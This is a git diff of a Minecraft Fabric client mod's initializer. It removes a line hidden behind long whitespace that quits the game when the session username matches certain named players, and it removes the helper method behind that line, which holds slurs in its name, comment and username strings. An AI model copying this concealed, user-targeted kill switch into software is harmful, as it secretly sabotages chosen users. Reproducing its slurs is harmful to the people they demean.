@@ -25,18 +25,9 @@ public class ShorelineMod implements ClientModInitializer {
     @Override
     public void onInitializeClient() {
         Shoreline.init();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                if (isRetardUsingClient()) System.exit(-1);
     }
 
     public static boolean isBaritonePresent() {
         return FabricLoader.getInstance().getModContainer("baritone").isPresent();
-    }
-
-    public static boolean isRetardUsingClient()
-    {
-        final MinecraftClient mc = MinecraftClient.getInstance();
-        // TODO: add any other retarded usernames
-        return mc.getSession().getUsername().equals("hockeyl8")
-                || mc.getSession().getUsername().toLowerCase().startsWith("niggerzoidfan");
     }
 }
